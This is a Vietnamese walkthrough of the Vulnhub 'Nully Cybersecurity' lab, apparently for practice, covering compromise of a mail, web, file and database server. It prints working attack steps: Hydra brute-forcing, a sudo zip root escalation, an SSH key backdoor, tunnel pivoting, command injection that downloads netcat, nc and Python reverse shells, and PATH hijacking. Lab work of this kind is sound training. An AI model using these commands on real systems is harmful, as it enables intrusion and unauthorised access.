**NULLY CYBERSECURITY Vulnhub**

Config máy null thành host only adapter để dễ dàng scan (trường hợp mạng
có nhiều máy sử dụng) và để an toàn khi pentest. (Hướng dẫn dưới đây vẫn
sử dụng bridge adapter)![A screenshot of a computer program AI-generated
content may be incorrect.](./images/media/image27.png)

IP address máy Null là 192.168.1.46/24

**Flag 1:**

Giả sử chúng ta chưa biết IP của máy Null, ta dùng 1 host Kali dùng
bridge adapter có cùng dải mạng với Null để scan IP của máy Null:

Netdiscover -i eth1 -r 192.168.1.0/24![A screenshot of a computer
AI-generated content may be
incorrect.](./images/media/image35.png)

Chú ý 192.168.1.46, address này có MAC vendor là PCS Systemtechnik GmbH
(của virtual box).

Scan thử IP này bằng nmap: nmap -sC -sV 192.168.1.46 -v![A computer
screen shot of a computer AI-generated content may be
incorrect.](./images/media/image36.png)

Ta thấy có 5 cổng được mở: 110, 80, 9000, 2222, 8000. Ta thử vào cổng 80
bằng web xem có thông tin gì: ![A screenshot of a computer AI-generated
content may be incorrect.](./images/media/image61.png)

Thông tin cho thấy ta chỉ có thể được attack vào port 110(POP3) và
2222(SSH) mà thôi.

Thử truy cập vào dịch vụ email và tìm thông tin xem:

Dùng lệnh \`telnet 192.168.1.46 110\` để vào dịch vụ POP3

Đăng nhập với thông tin được cung cấp ở web:

USER pentester

PASS qKnGByeaeQJWTjj2efHxst7Hu0xHADGO

LIST (xem danh sách email) ![A screenshot of a computer program
AI-generated content may be
incorrect.](./images/media/image34.png)

Ta thấy có 1 message

RETR 1 (đọc thư đầu tiên) ![A screenshot of a computer screen
AI-generated content may be
incorrect.](./images/media/image45.png)

Từ email trên ta có thông tin rằng đây là admin của mail server, tên là
Bob Smith (rất có khả năng tên user và password đăng nhập hệ thống liên
quan đến tên), anh ta nói password rất đơn giản.

Vậy ta liệt kê ra 1 danh sách tên user liên quan đến Bob, tạo ra 1 file
username.txt: ![A screenshot of a computer AI-generated content may be
incorrect.](./images/media/image51.png)

Trong thực tế có thể nhiều hơn.

Lấy dữ liệu password liên quan tới tên Bob ở file rockyou.txt để tạo
file password.txt![A computer screen with white text AI-generated
content may be incorrect.](./images/media/image43.png)được 2453 password.

Giờ chạy Hydra để bruteforce xem tài khoản và password của Bob là gì.

Chạy lệnh \`hydra --L username.txt -P username.txt -f
ssh://192.168.1.46:2222\`

Bruteforce thành công với tài khoản \`bob\` password \`bobby1985\`![A
computer screen shot of a computer code AI-generated content may be
incorrect.](./images/media/image40.png)

Chạy \`ssh bob@192.168.1.46 -p 2222\` để ssh vào mail server của Bob:
![](./images/media/image50.png)

Chạy \`sudo -l\` để xem user bob có thể chạy quyền root với những lệnh
nào: ![A computer screen with white text AI-generated content may be
incorrect.](./images/media/image41.png)ta thấy có thể chạy check.sh với tư cách
là người dùng my2user, ta thử chạy: ![A computer screen shot of a
computer screen AI-generated content may be
incorrect.](./images/media/image46.png)

Leo thang sang my2user bằng cách thêm /bin/bash vào file check.sh để
spawn shell của my2user (privilege escalation to my2user) ![A screenshot
of a computer AI-generated content may be
incorrect.](./images/media/image42.png)

Chạy lệnh \`sudo -u my2user /bin/bash
/opt/scripts/check.sh\`![](./images/media/image47.png)đã leo thang sang my2user, ta chạy lệnh
sudo -l để xem có gì exploit được không:
![](./images/media/image49.png)my2user có thể chạy /usr/bin/zip với quyền
root mà không cần password. Vì thế ta sử dụng một lỗi leo thang quyền
root qua zip tham khảo từ:
https://gtfobins.github.io/gtfobins/zip/#sudo

![A computer screen shot of a computer program AI-generated content may
be incorrect.](./images/media/image52.png)

Xâm nhập vào mail server thành công.

Giải thích lệnh exploit:

\`TF=\$(mktemp -u)\` tạo một tên file tạm

\`sudo zip \$TF /etc/hosts -T -TT 'sh #'\` lệnh này là lệnh exploit
chính, chạy zip với quyền sudo (root) do my2user được chạy zip với quyền
root không cần pass, lệnh sẽ zip /etc/hosts với cái tên \$TF. Phần
chính:

Tham số '-T' là để test zip file sau khi tạo.

Tham số '-TT' là tham số hiếm gặp và đặc biệt, cho phép sử dụng một lệnh
khác để test file zip thay vì lệnh test thông thường là unzip. Lệnh thay
thế này cũng được thừa hưởng quyền từ lệnh gốc.

Vì thế mà attacker thêm lệnh 'sh #' để spawn root shell. Chú ý: zip chạy
lệnh \`sh #\` với quyền root vì chính nó cũng được chạy với quyền root
và tham số '#' để comment out hết các phần phía sau của lệnh khiên hệ
thống chạy lệnh sh và spawn root shell.

**Flag 2:**

![](./images/media/image23.png)sau khi leo thang vào root của mail server
thành công ta tạo một backdoor với ssh key để có thể tùy ý xâm nhập bất
cứ lúc nào.

![](./images/media/image32.png)

Ta thu được thông tin IP Mail server: 172.17.0.4 thuộc dải mạng
172.17.0.0/16

Tải netdiscover trên mail-server để scan dải mạng. (netdiscover -i
eth0 - r 172.17.0.0/16)

Thu được kết quả:![](./images/media/image10.png)

172.17.0.1 là gateway của dải mạng.

![](./images/media/image12.png)172.17.0.3 có cổng 80(http) mở có thể đoán
đây là web server.

![](./images/media/image8.png)172.17.0.2 mở cổng 21(ftp) -\> file
server.

thử curl vào port 80 của 172.17.0.3 xem có thu được thông tin gì
không![](./images/media/image17.png)vậy đây chính là web server.

Ta thử dùng kỹ thuật pivot và lateral movement (truy cập local web của
web server ngay trên máy local - attacker thông qua ssh tunnel tới mail
server).

ssh -L \[local_port\]:\[target\]:\[target_port\] \[jump_host\]

ssh -L 8000:172.17.0.3:80 root@192.168.1.46 -p 2222 -i
id_rsa![](./images/media/image33.png)đã port forward thành công.

Dùng DIRB để scan ra các file ẩn trên web (dirb
http://localhost:8000)
![](./images/media/image6.png)

ta thấy có thư mục /ping đáng để khai thác với note LISTABLE.

Thử truy cập vào
http://localhost:8000/ping/
![](./images/media/image48.png)

Ta truy cập tiếp
http://localhost:8000/ping/For-Oscar.txt
![](./images/media/image29.png)không có gì đáng ngờ với file text này.

Tiếp với http://localhost:8000/ping/ping.php
![](./images/media/image11.png)Có note hướng dẫn sử dụng param host để
truy vấn, ta sẽ thử
http://localhost:8000/ping/ping.php?host=172.17.0.1 xem sao
![](./images/media/image53.png)vậy là web dính command injection, đưa
tham số vào mà không validate trước khi thực thi nên ta sẽ khai thác
cách này.

Ý tưởng để khai thác RCE từ lỗi injection trên như sau: thử reverse
shell từ web server về mail server bằng injection lệnh xem sao.

Đầu tiên ta hãy thử với cung cụ Netcat (nc). Trước tiên ta tải nc trên
máy attacker (mail server) và máy target (web server)
![](./images/media/image44.png)với máy target cách install phức tạp hơn vì
ta không thể install trực tiếp netcat được (cần quyền root - trong khi
ta đang khai thác với quyền của www-data)

đầu tiên ta public file binary của nc và hosting 1 http server ở
attacker để target wget về![](./images/media/image19.png)

Chuỗi injected command để install nc về target:

http://localhost:8000/ping/ping.php?host=; wget http://172.17.0.5:9000/nc

http://localhost:8000/ping/ping.php?host=; chmod 777 nc

http://localhost:8000/ping/ping.php?host=; ls -la nc; pwd

note: vì bài lab này được làm trong 2 giai đoạn nên việc khởi động lại
vm làm xáo trộn ip của các server: 172.17.0.5 là mail, 172.17.0.2 là
file server, 172.17.0.3 là web server.

![](./images/media/image59.png)sau khi tải nc về máy target thành công
như trên, ta thử dùng nc reverse shell từ target về attacker qua cổng
9000 xem sao

http://localhost:8000/ping/ping.php?host=; /var/www/html/ping/nc 172.17.0.5 9000 -e /bin/bash![](./images/media/image37.png)![](./images/media/image5.png)

không có điều gì xảy ra, có thể version netcat này không hỗ trợ option
-e hoặc có restrictions về shell execution.

Chuyển sang dùng Python scripting:

python3 -c \'import socket,subprocess,os; \# Import các module cần thiết

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \# Tạo TCP socket

s.connect((\"172.17.0.2\",9000)); \# Kết nối đến MailServer:9000

os.dup2(s.fileno(),0); \# stdin → socket

os.dup2(s.fileno(),1); \# stdout → socket

os.dup2(s.fileno(),2); \# stderr → socket =\> Redirect
stdin/stdout/stderr vào socket

subprocess.call(\[\"/bin/sh\",\"-i\"\])\' \# Spawn interactive shell

Chuyển thành url:

http://localhost:8000/ping/ping.php?host=;%20python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22172.17.0.5%22,9000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([%22/bin/sh%22,%22-i%22])%27

![](./images/media/image54.png)reverse thành công!

Ta tìm được 2 user đáng chú ý từ những lần mò:
![](./images/media/image25.png)

1000: Oscar là sysadmin của web server

1001: Oliver chịu trách nhiệm website và các ứng dụng web

Từ đây thu thập thông tin thêm về 2 user quan trọng này qua các file họ
sở hữu.

find / -type f -user 1000 2\>/dev/null

find / -type f -user 1001 2\>/dev/null

![](./images/media/image1.png)ta tìm được info Oscar sở hữu Python3 nên
rất có thể sẽ khai thác được gì đó bằng các python script, còn Oliver có
1 file backup .secret khá nghi ngờ.
![](./images/media/image38.png)"my password -
4hppfvhb9pW4E4OrbMLwPETRgVo2KyyDTqGF"

Oliver để mật khẩu trong file backup này, ta thử lấy mật khẩu đó ssh:
![](./images/media/image16.png)thành công xâm nhập vào user Oliver.

Vừa rồi ta biết rằng Oscar sở hữu Python3, vậy nên có thể chạy các lệnh
Python khai thác dưới quyền Oscar:

python3 -c \'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")\'

**\"/bin/sh\"**: path tới shell

**\"sh\"**: argv\[0\] (tên program)

**\"-p\"**: argv\[1\] - **PRIVILEGED MODE**

-\> cho phép chạy lệnh dưới quyền Oscar, access vào home directory của
Oscar, đọc và ghi file của Oscar.

![](./images/media/image20.png)"H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o"

Xâm nhập vào home directory của Oscar thành công và ta thu được mật khẩu
của user này.

Thử SSH vào user: ![](./images/media/image4.png)

SSH thành công. ![](./images/media/image56.png)

Kiểm tra các thư mục ta thấy có /scripts, trong đó có chương trình
current-date chạy SUID với quyền root, khi chạy chương trình khả năng
gọi đến hàm /bin/date.

Dùng Strings extract ra xem có thông tin nào hữu
ích:![](./images/media/image7.png)để ý đến phần này có gọi đến date nhưng
không rõ ràng là /bin/date nên rất có thể khi chạy hệ thống sẽ phải dựa
vào biến \$PATH để tìm lệnh.![](./images/media/image9.png)

Kiểm tra biến \$PATH: ![](./images/media/image24.png)

Ý tưởng: đánh lừa hệ thống scan path của Oscar với file date giả có chứa
lệnh spawn root shell, vì current-date được chạy với SUID
root.![](./images/media/image3.png)

Giờ ta thử chạy lại current-date và xem có spawn được root shell không:
![](./images/media/image15.png)thành công!!!

Tìm ra được 2_flag.txt ![](./images/media/image2.png)

**Flag 3:**

Sau khi truy cập vào root của web server ta có thể ftp vào file server
bằng user anonymous (không cần password) -\> anonymous FTP enabled
vulnerability:![](./images/media/image55.png)ta mò ra được 2 file: backup.zip và
file.txt, get về web server![](./images/media/image30.png)

![](./images/media/image14.png)

file.txt không có gì đáng chú
ý![](./images/media/image18.png)

Chuyển backup.zip qua máy local để phân tích dễ hơn bằng netcat:

#Remote Server: nc -w 3 192.168.18.145 8888 \< backup.zip \# Chuyền
backup.zip tới ip address của locl bằng port 8888

#Local Machine: nc -lvnp 8888 \> backup.zip \# nhận backup.zip qua cổng
8888

![](./images/media/image60.png)

unzip backup.zip fail vì cần có
password![](./images/media/image26.png)

dùng zip2john để chuyển file nén này thành hash phục vụ cho crack (vì
john không crack được binary):

![](./images/media/image39.png)

chạy john để crack tìm ra password

![](./images/media/image21.png)

password của file nén là 1234567890

mở khóa thành công và tìm được thông tin về user donald

![](./images/media/image31.png)

có thể là người dùng có quyền truy cập vào datacenter nên ta thử ssh từ
web server

![](./images/media/image28.png)

vào được database server với user donald

sử dụng tool linpeas để tìm ra những lệnh SUID có thể khai thác:

![](./images/media/image58.png)

ta tìm được /usr/bin/screen-4.5.0 với quyền root, có thể khai thác để
vào root của datacenter

ta có script exploit:
https://www.exploit-db.com/raw/41154

ý tưởng: lợi dụng SUID binary chạy với quyền root, tự động thêm thư viện
mã độc vào để leo quyền thành root

![](./images/media/image57.png)![](./images/media/image13.png)

ta đã có quyền root

![](./images/media/image22.png)
